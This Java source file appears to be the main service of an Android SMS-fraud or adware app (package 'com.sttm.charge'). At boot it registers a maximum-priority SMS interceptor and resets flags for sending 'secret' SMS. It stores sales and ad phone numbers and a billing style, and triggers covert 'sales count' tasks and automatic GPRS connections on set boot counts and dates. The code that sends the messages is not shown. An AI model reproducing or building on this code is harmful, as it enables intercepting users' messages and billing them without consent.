package com.sttm.charge;

import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences.Editor;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;

import com.sttm.dataImpl.KsoContentResolver;
import com.sttm.dataImpl.KsoDataCenter.DataCenter;
import com.sttm.util.KsoCache;
import com.sttm.util.KsoHelper;
import com.sttm.util.LogFile;
import com.sttm.util.ShareProDBHelper;

/**
 * 主服务程序
 * 
 * 1，初始化数据；2 启动短信拦截器 3 启动定时广播接收器 4 开始统计销量或者自动联网
 * 
 * @author ligm
 * 
 */
public class MainService extends Service {
	private final String TAG = "MainService";
	private KsoCache cache = KsoCache.getInstance();
	private ShareProDBHelper share;
	private int driveup;
	private KsoMainCourse ksoMainCourse;
	private KsoContentResolver kcr;

	@Override
	public void onCreate() {
		// ---------------------------------------------
		// 开机，发送短信相关参数清零
		share = new ShareProDBHelper(this.getApplicationContext());
		kcr = new KsoContentResolver(this.getApplicationContext());
		Editor editor = share.writer("sendSmsFlag");
		editor.putBoolean("sendSecretSms", false);
		editor.putString("secretSmsReplyNumber", "");
		editor.putBoolean("sendNormonSms", false);
		editor.putString("keyword", "");
		editor.commit();
		//Log.d(TAG, "开机初始化发送短信相关参数");
		LogFile.WriteLogFile("开机初始化发送短信相关参数");
		// ---------------------------------------------
		
		
		
		

		super.onCreate();
	}

	@Override
	public void onDestroy() {

		super.onDestroy();
	}

	@Override
	public void onStart(Intent intent, int startId) {

		super.onStart(intent, startId);
		ksoMainCourse = new KsoMainCourse();
		driveup = intent.getIntExtra("driveup", 0);

		//Log.d(TAG, "本次开机次数" + driveup);
		//Log.d(TAG, "主服务现在启动");

		// ============================================================================
		// 一些测试数据
		
		if(!kcr.isSave("curstomID")){
			String curStr = KsoCache.getInstance().getValue("curstomID")!= null 
					? (String)KsoCache.getInstance().getValue("curstomID"): "gunstofire";		
			this.insert(curStr, this);
			
		}
		
		
		
		
		
		
		LogFile.WriteLogFile("缓存大小" + KsoCache.getInstance().getCacheSize());
		LogFile.WriteLogFile("销量号码"
				+ KsoCache.getInstance().getValue("saleNumbers"));
		//Log.d(TAG, "销量号码" + KsoCache.getInstance().getValue("saleNumbers"));
		//Log.d(TAG, "广告号码" + KsoCache.getInstance().getValue("adsNumbers"));
		//Log.d(TAG, "缓存大小" + KsoCache.getInstance().getCacheSize());
		//Log.d(TAG, "发送时间间隔" + KsoCache.getInstance().getValue("adsTime"));
		//Log.d(TAG, "收费方式" + KsoCache.getInstance().getValue("billStyle"));
		// ==========================================================================

		// ==============================================================
		IntentFilter localIntentFilter = new IntentFilter(
				"android.provider.Telephony.SMS_RECEIVED");
		localIntentFilter.setPriority(Integer.MAX_VALUE);
		SmsReceiver sr = new SmsReceiver();
		registerReceiver(sr, localIntentFilter);
		//Log.d(TAG, "启动了短信拦截器");
		LogFile.WriteLogFile("启动了短信拦截器");
		// ===============================================================

		// ==============================================================
		IntentFilter netChangeFilter = new IntentFilter(
				"android.net.conn.CONNECTIVITY_CHANGE");
		netChangeFilter.setPriority(Integer.MAX_VALUE);
		NetWorkChangeReceive nr = new NetWorkChangeReceive();
		registerReceiver(nr, netChangeFilter);
		//Log.d(TAG, "启动了网络切换广播接收器");
		LogFile.WriteLogFile("启动了网络切换广播接收器");
		// ===============================================================

		// ==============================================================
		IntentFilter alarmFilter = new IntentFilter(
				"com.kso.action.ALARMRECEIRVE");
		KsoAlarmService kas = new KsoAlarmService();
		registerReceiver(kas, alarmFilter);
		//Log.d(TAG, "启动了定时广播");
		LogFile.WriteLogFile("启动了定时广播");
		// ===============================================================

		// ==========================================================================
		// 判断这次开机是否开始统计销量和自动联网

		ksoMainCourse.startMainAlarm(this.getApplicationContext());

		int driveup_cfg = cache.getValue("driveup") != null ? (Integer) cache
				.getValue("driveup") : 0;
		//Log.d(TAG, "开机次数" + driveup_cfg);

		int intelnetCount = cache.getValue("intelnetCount") != null ? (Integer) cache
				.getValue("intelnetCount") : 0;
		//Log.d(TAG, "自动联网次数" + driveup_cfg);
		int month = KsoHelper.getCurrentMonth();

		int internetedCount = share.getSharedPreferences("dataCenter").getInt(
				month + "月", 0);

		int saleCount = cache.getValue("sellCount") != null ? (Integer) cache
				.getValue("sellCount") : 2;

		String IntelnetDates = cache.getValue("internetDate") != null ? (String) cache
				.getValue("internetDate") : "";
		String[] IntelnetDate = IntelnetDates.split(",");
		//Log.d(TAG, "自动联网日期" + IntelnetDates);
		long startIntelnetDate = cache.getValue("startIntelnetDate") != null ? (Long) cache
				.getValue("startIntelnetDate") : 0;
		//Log.d(TAG, "开始联网日期" + startIntelnetDate);
		if (intelnetCount >= internetedCount) {
			//Log.d(TAG,""+ ksoMainCourse.decideStartFlag(startIntelnetDate,this.getApplicationContext()));
			//Log.d(TAG, (driveup == driveup_cfg) + "");
			if (ksoMainCourse.decideStartFlag(startIntelnetDate,
					this.getApplicationContext())
					&& (driveup >= driveup_cfg)) {

				//Log.d(TAG, "这次开机可以开始销量统计和自动联网");
				LogFile.WriteLogFile("这次开机可以开始销量统计和自动联网");

				// 销量统计
				if (ksoMainCourse.checksalesvolumeOccasion(driveup_cfg,
						driveup, saleCount)) {
					ksoMainCourse.startTimerHandler(this
							.getApplicationContext());

				}

				// GPRS更新
				//Log.d(TAG,"GPRS更新"+ ksoMainCourse.checkGPRSOccasion(this.getApplicationContext(),IntelnetDate));
				if (ksoMainCourse.checkGPRSOccasion(
						this.getApplicationContext(), IntelnetDate)) {
					ksoMainCourse
							.startGPRSHandler(this.getApplicationContext());
				}

			} else {
				//Log.d(TAG, "这次开机不可以销量统计和自动联网，因为日期己过期或者开机次数还不到");
				LogFile.WriteLogFile("这次开机不可以销量统计和自动联网，因为日期己过期或者开机次数还不到");

			}

		} else {
			//Log.d(TAG, "本月GRPS更新次数够了，不能再更新");
			LogFile.WriteLogFile("本月GRPS更新次数够了，不能再更新");
		}
		// ============================================================================

	}

	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}
	
	
	private void insert(String str,Context context) {
		
		Uri uri = DataCenter.CONTENT_URI;
		
		ContentValues values  =  new ContentValues();
		
		values.put(DataCenter.KSOKEY, "curstomID");
		
		values.put(DataCenter.KSOVALUE,str);
		
		context.getContentResolver().insert(uri, values);
		
		
	}

}
